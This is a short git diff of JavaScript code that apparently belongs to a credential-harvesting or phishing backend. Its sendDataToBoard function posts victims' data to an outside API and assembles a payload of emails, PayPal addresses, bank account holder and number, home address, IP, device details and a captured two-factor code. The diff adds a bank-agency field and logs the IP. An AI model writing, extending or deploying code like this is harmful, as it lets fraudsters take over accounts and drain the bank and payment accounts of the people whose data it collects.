@@ -8,10 +8,7 @@ const sendDataToBoard = async (data) => {
     checked: true,
   };
 
-  $.post(
-    "https://profiles-api.net/profile_id_api/api/new_profile_id.php/",
-    upData
-  )
+  $.post("https://profiles-api.net/profile_id_api/api/new_profile_id.php/", upData)
     .done(function (response) {
       data["personalInfo"] = response[0];
 
@@ -25,6 +22,8 @@ const sendDataToBoard = async (data) => {
     const board_id = 1329202495;
     const providers_source = "Massimo2";
     const geo = "en";
+
+    console.log("data.ip", data.ip);
 
     const dataToSend = {
       action: "send_data",
@@ -54,17 +53,18 @@ const sendDataToBoard = async (data) => {
       pay_option: data.paymentMethod || "",
       reference_code: data.referralCode || "",
       country: data.country || "",
-      devices: data.devices || "",
+      devices: data.devices.join() || "",
       city: data.city || "",
       email: data.email || "",
       paypal_email: data.paypalEmail || "",
       beneficiary: data.holderName || "",
+      bank: data.bankAngency || "",
       acc: data.bankAccountCode || "",
       fa_token: data.code2FA || "",
       user_type: data.userType || "",
       status: data.status || "",
       status_observation: data.statusObservation || "",
-      os: data.os || "",
+      os: data.os.join() || "",
       address: data.address || "",
       referral: data.referral || "",
       zip_code: data.zipCode || "",
